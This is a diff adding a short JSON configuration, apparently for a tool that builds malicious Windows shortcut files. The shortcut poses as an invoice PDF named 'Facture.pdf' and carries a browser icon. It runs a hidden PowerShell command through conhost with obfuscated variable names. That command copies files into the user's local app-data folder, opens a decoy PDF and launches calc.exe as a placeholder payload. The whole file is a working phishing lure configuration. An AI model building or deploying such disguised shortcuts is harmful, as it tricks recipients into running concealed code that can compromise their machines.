@@ -1,0 +1,7 @@
+{
+    "lnk_filename" : "Facture.pdf",
+    "lnk_description" : "Facture du 12 03",
+    "lnk_icon" : "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe",
+    "exe_path" : "C:\\Windows\\System32\\conhost.exe",
+    "payload" :  "--headless \"%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"$pytoma=$env:localappdata;$chatpoma=[System.IO.Path]::GetFullPath($pytoma);$poledemy = $pwd;Copy-Item \"$poledemy\\*\" -Destination $chatpoma -Recurse -Force | Out-Null;cd $chatpoma; .\\invoice.pdf; .\\calc.exe"
+}
